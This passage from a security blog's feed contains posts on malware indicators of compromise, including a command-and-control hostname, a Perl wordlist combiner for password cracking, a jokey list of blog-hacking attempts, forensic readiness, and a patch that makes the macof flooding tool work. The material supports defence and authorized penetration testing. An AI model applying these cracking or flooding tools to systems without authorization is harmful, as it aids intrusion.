<p><code>sample.exe</code> has the same Hashes as <code>Pro InvoiceWMZ45445.exe</code>. Interesting, isn't it? So, this Malware isn't a Dropper; but instead it installs itself under a different name.</p>
<p><strong>Indicators of Compromise (IOC) of <code>sample.exe</code>:</strong></p>
<ul>
<li>creates the Mutant <code>Sessions1BaseNamedObjectsMUTEX-zZEeV-Zndko</code></li>
<li>tries to resolve fredamata81.ddns.net</li>
<li>tries to connect to port 2015 of fredamata81.ddns.net (which seems to be closed at the moment)</li>
<li>consumes a lot of CPU time (20% on my machine)</li>
</ul>
<p><strong>Additional Information</strong></p>
<ul>
<li>The executable has Debug information stored externally in&nbsp;<code>d:bak_desktopnew folderstub1000_11_25_2015bdebugstub1000_11_25_2015b.pdb</code>. I assume the file has been compiled on 2015/11/25. Maybe ;-)</li>
</ul>
<p>More dynamic analysis will follow soon. First I must remove the call to <code>IsDebuggerPresent()</code>. But not today, anymore...</p>
<p><strong>Update:</strong></p>
<p>Virustotal has documented this specimen under&nbsp;<a href="https://www.virustotal.com/de/file/bf6c2c3f9cbb35023a38516e6b438f9125b7056429804c88c444fa37e0254956/analysis/" target="_blank" rel="noopener noreferrer" title="https://www.virustotal.com/de/file/bf6c2c3f9cbb35023a38516e6b438f9125b7056429804c88c444fa37e0254956/analysis/">https://www.virustotal.com/de/file/bf6c2c3f9cbb35023a38516e6b438f9125b7056429804c88c444fa37e0254956/analysis/</a></p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Merging wordlist files]]></title>
        <id>https://janstarke.github.io/blog/2015/08/05/merging-wordlist-files</id>
        <link href="https://janstarke.github.io/blog/2015/08/05/merging-wordlist-files"/>
        <updated>2015-08-05T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Sometimes when cracking password, one has to create password candidates which are combinations of words from a wordlist. Unfortunately, common password cracking tools do not support this feature. This makes perfectly sense, because the task of a password cracking tool is cracking passwords. We need a tool which creates line wise cross combinations of text files.]]></summary>
        <content type="html"><![CDATA[<p>Sometimes when cracking password, one has to create password candidates which are combinations of words from a wordlist. Unfortunately, common password cracking tools do not support this feature. This makes perfectly sense, because the task of a password cracking tool is cracking passwords. We need a tool which creates line wise cross combinations of text files.</p>
<p>Using perl, this is a simple task:</p>
<div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/usr/bin/perl -w</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#/usr/bin/perl -w</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use strict;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use warnings;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use Getopt::Long;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $first = '-';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $second = undef;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $dest = '-';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $max_length = undef;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub Usage(;$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $usage = '';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (my $message = shift) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $usage .= $message . "n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $usage .= "crossproduct.pl --first=&lt;infile&gt; --second=&lt;infile&gt; --dest=&lt;outfile&gt;";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $usage;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub ValidateInputFile($) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $filename = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return if $filename eq '-';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    -f $filename or die Usage("'$filename' is not a file");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    -r $filename or die Usage("'$filename' is not readable");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub ValidateOutputFile($) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $filename = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return if $filename eq '-';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return unless -e $filename;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # the file does not exist, so it will be created</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    -f $filename or die Usage("'$filename' is not a file");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    -w $filename or die Usage("'$filename' is not writable");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GetOptions (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "first=s" =&gt; $first,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "second=s" =&gt; $second,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "dest=s" =&gt; $dest,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "length=i" =&gt; $max_length) or die Usage();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">defined($first) or die Usage("missing first input file");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">defined($second) or die Usage("missing second input file");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">($first ne '-' or $second or '-') or die Usage("cannot combine stdin with itself");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ValidateInputFile($first);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ValidateInputFile($second);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ValidateOutputFile($dest);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my ($first_fh, $second_fh, $dest_fh);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($first eq '-') {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $first_fh = *STDIN;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">} else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    open($first_fh, "&lt;$first") or die Usage($!);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($second eq '-') {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $second_fh = *STDIN;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">} else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    open($second_fh, "&lt;$second") or die Usage($!);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($dest eq '-') {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $dest_fh = *STDOUT;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">} else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    open($dest_fh, "&gt;$dest") or die Usage($!);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my ($a, $b, $da, $db);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my ($dest_first, $dest_second);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($first eq '-') {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ($a, $b) = ($first_fh, $second_fh); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ($dest_first, $dest_second) = ($da, $db);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">} else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ($a, $b) = ($second_fh, $first_fh);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ($dest_second, $dest_first) = ($da, $db);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while ($da = &lt;$a&gt;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    seek($b, 0, 0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    while ($db = &lt;$b&gt;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        chomp $da;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        chomp $db;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        my $word = "$$dest_first$$dest_second";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if ($max_length) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $word = substr($word, 1, $max_length); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print $dest_fh "$word";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The script has 4 parameters:</p>
<table><thead><tr><th>Parameter</th><th>Meaning</th></tr></thead><tbody><tr><td><code>--first</code></td><td>file name of the wordlist for the first part of the generated words; or "-" for stdin (which is the default value)</td></tr><tr><td><code>--second</code></td><td>file name of the wordlist for the second&nbsp;part of the generated words; or "-" for stdin</td></tr><tr><td><code>--dest</code></td><td>name of the file where the generated wordlist will be stored; or "-" for stdout (which is the default value)</td></tr><tr><td><code>--length</code></td><td>maximum length of generated words. All words which are longer then this value will be truncated. This parameter is optional. If you use this parameter, you should pipe the output to uniq</td></tr></tbody></table>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Rexgen is back again]]></title>
        <id>https://janstarke.github.io/blog/2015/03/08/rexgen-is-back-again</id>
        <link href="https://janstarke.github.io/blog/2015/03/08/rexgen-is-back-again"/>
        <updated>2015-03-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[... with a new version 1.2.3 and a new repository location//github.com/janstarke/rexgen]]></summary>
        <content type="html"><![CDATA[<p>... with a new version 1.2.3 and a new repository location: <a href="https://github.com/janstarke/rexgen" target="_blank" rel="noopener noreferrer">https://github.com/janstarke/rexgen</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="new-features">New features:<a class="hash-link" aria-label="Direct link to New features:" title="Direct link to New features:" href="https://janstarke.github.io/blog/2015/03/08/rexgen-is-back-again#new-features">​</a></h2>
<ul>
<li>improved uppercase/lowercase variation: 'a(?i<!-- -->:bc<!-- -->)' creates abc, abC, aBC, aBc</li>
<li>that's it. But I had to rewrite a lot of internal data representation, so that the modifier <code>i</code> for <em>ignore case</em> may be the first one in long list of additional iterators. One of my ideas for the next versions is some kind of Levenshtein Iterator. The idea is that the modifier will create all variants of a word with a Levenshtein distance of 1</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-else-is-new">What else is new?<a class="hash-link" aria-label="Direct link to What else is new?" title="Direct link to What else is new?" href="https://janstarke.github.io/blog/2015/03/08/rexgen-is-back-again#what-else-is-new">​</a></h2>
<ul>
<li>
<p>John the Ripper (jumbo) uses the new API of rexgen, so you can build the newest version JtR together with the newest version of rexgen</p>
</li>
<li>
<p>wfuzz does not use rexgen, until now. I created a fork of wfuzz <a href="https://github.com/janstarke/wfuzz" target="_blank" rel="noopener noreferrer">https://github.com/janstarke/wfuzz</a>. Unfortunately, xmendez ignores my pull request :-( But you can use my fork and I will try to keep it up2date</p>
</li>
</ul>
<p>So long</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to (not) hack jasa's blog]]></title>
        <id>https://janstarke.github.io/blog/2015/02/11/how-to-not-hack-jasas-blog</id>
        <link href="https://janstarke.github.io/blog/2015/02/11/how-to-not-hack-jasas-blog"/>
        <updated>2015-02-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Today, a strange guy tried to hack this blog. He didn't succeed. What a shame. So, in this post, I will try to give you some hints about what to do and what not to do if you're trying to hack into this blog:]]></summary>
        <content type="html"><![CDATA[<p>Today, a strange guy tried to hack this blog. He didn't succeed. What a shame. So, in this post, I will try to give you some hints about what to do and what not to do if you're trying to hack into this blog:</p>
<ol>
<li>
<p>Try to guess my username and password. Start with jasa. This is not my username, but you can try it anyway. I'm a hacker, so try good passwords first. You're a hacker too, so you are using good passwords as wesll. Start with your own passwords; maybe all hackers use the same passwords. Nope. Try "Raketenkatze123" Nope. Use the wordlist you've found on the internet. After the first 1000 attempts I know which wordlist you are using and can check if my password is part of it. ...which is one thing I regularly do with all of my passwords, as soon as I find a new good wordlist.</p>
</li>
<li>
<p>Try to find some cross site scripting. After you've found one (there is none known), you can 2.a Send a malicious link to me, to steal my session 2.b Create a malicious comment, to steal my session 2.c Create a malicious comment, to exploit one of the currently known cross site request forgery vulnerabilities in wordpress.</p>
</li>
</ol>
<p>Have you first checked if wordpress is vulnerable against session hijacking, before you fill wordpress's log files and my mailbox with your useless attempts? By the way:</p>
<ol start="3">
<li>
<p>Make sure that no one knows you. Although I cannot read wordpress's log files, you've been so kind to try to create a malicious comment. I've got a notification about this. Now, I have your IP address and the corresponding time. Did you know that it is possible to identify the computer you are using at the moment? The power feature is called "Telecommunications data retention"</p>
</li>
<li>
<p>Try to find a SQL injection vulnerability. Good luck. In the meantime I was able to geolocate your position, using your IP. Until now, you violated at least 2 statutes of the country you are living in.</p>
</li>
<li>
<p>Before you did some reconnaissance, hopefully you made sure that no other legal persons are involved in your attack. Now, you determine that my blog is not hosted by me, but by wordpress.com, whose place of jurisdiction is the United States. D'oh. They know your IP address, too.</p>
</li>
<li>
<p>Double-check that you typed the URL of this blog using your keyboard. You didn't want to click on a link to this blog, because I could see your Referer :-b</p>
</li>
<li>
<p>This is a blog about security (among others). Make sure your browser is up to date before you open this page (TODO: I must move this entry to position 1)</p>
</li>
</ol>
<p>Kind regards</p>
<p>See you tomorrow, M. :-)</p>
<p>BTW, I forgot to say that you forgot to do a port scan against the LB of wordpress.com. Which doesn't matter anymore ... Knock knock</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Measuring Forensic Readiness]]></title>
        <id>https://janstarke.github.io/blog/2015/02/02/measuring-forensic-readiness</id>
        <link href="https://janstarke.github.io/blog/2015/02/02/measuring-forensic-readiness"/>
        <updated>2015-02-02T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Most of our customers need help in optimizing their infrastructure security. What does that mean? You want to]]></summary>
        <content type="html"><![CDATA[<p>Most of our customers need help in optimizing their infrastructure security. What does that mean? You want to</p>
<ul>
<li>minimize your attack surface</li>
<li>prevent any successful attacks to (publicly) available services</li>
<li>limit the impact of successful attacks</li>
<li>be able to recover after a successful attack</li>
<li>know what actually happened</li>
</ul>
<p>This last point, knowing what actually happened, can be achieved through various approaches:</p>
<ul>
<li>You could do logging of all significant events</li>
<li>You could use a SIEM component to collect, correlate and evaluate all logging events and, if you want to, netflow data</li>
<li>You can do forensic analysis of your hard drives, log files, etc.</li>
</ul>
<p>Forensic Readiness first seemed to us as the situation in which you are able to do forensics. But this is not precise enough. In fact, we can determine multiple levels of forensic readiness, in which you are able to answer the following questions:</p>
<ol>
<li>Did anything happen at all?</li>
<li>What have been the symptoms of the incident?</li>
<li>When did the symptoms first arise?</li>
<li>Which systems are affected?</li>
<li>What exactly happened to the affected systems?</li>
<li>At which day and time did the attack start?</li>
<li>Which other machines are compromised as well?</li>
<li>From which machines did the attack originate?</li>
<li>Which user account was used to initially run the attack?</li>
<li>Which persons are able to use the user account that ran the attack</li>
</ol>
<p>The more questions you was able to answer (in order) in the case an incident occurs, the more "forensic ready" are you.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Invalid TCP segments created by macof]]></title>
        <id>https://janstarke.github.io/blog/2015/02/01/invalid-tcp-segments-created-by-macof</id>
        <link href="https://janstarke.github.io/blog/2015/02/01/invalid-tcp-segments-created-by-macof"/>
        <updated>2015-02-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Some days ago, we used the tool macof, which is part of the dsniff package, in one penetration test. We observed that our attack had no effect to the hosts in the network, so we started sniffing around. Wireshark was our friend.]]></summary>
        <content type="html"><![CDATA[<p>Some days ago, we used the tool <em>macof</em>, which is part of the <a href="http://www.monkey.org/~dugsong/dsniff/" target="_blank" rel="noopener noreferrer" title="dsniff">dsniff</a> package, in one penetration test. We observed that our attack had no effect to the hosts in the network, so we started sniffing around. Wireshark was our friend.</p>
<p>Wireshark identified our packets, generated by <em>macof</em>, as "invalid". It took some time for us to realize that IP Header value for <em>Total Length</em> was indeed wrong! We used <em>macof</em> to send TCP SYN segments to some specific port, so <em>Total Length</em> should be 40 (20 Byte IP Header + 20 Byte TCP Header), but macos generated packets with a value of 20.</p>
<p>So we started a little code reading session and found the following statements in macof.c:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">libnet_build_tcp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sport</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dport</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> seq</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> TH_SYN</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> LIBNET_TCP_H</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> l</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">libnet_build_ipv4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LIBNET_TCP_H</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">libnet_get_prand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LIBNET_PRu16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> IPPROTO_TCP</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> src</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dst</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> l</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Obviously, the length of the IP Header is not included in this calculation. We changed the above statements to</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">libnet_build_tcp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sport</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dport</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> seq</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> TH_SYN</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> LIBNET_TCP_H</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> l</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">libnet_build_ipv4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LIBNET_IPV4_H</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">LIBNET_TCP_H</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">libnet_get_prand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LIBNET_PRu16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> IPPROTO_TCP</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> src</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dst</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> l</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>with the result, that Wireshark didn't complain about our packets anymore.</p>
<p>And, more important, our attack did work now :-)</p>
<p>After the test, I sent an email to the author of macof and dsniff, including a patch of what we've done, but until today I received no answer. So, I'll publsh our patch here, and you are free to use it:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;diff -rupN dsniff-2.4_beta1-r6/macof.c dsniff-2.4_beta1-r6_FIX/macof.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
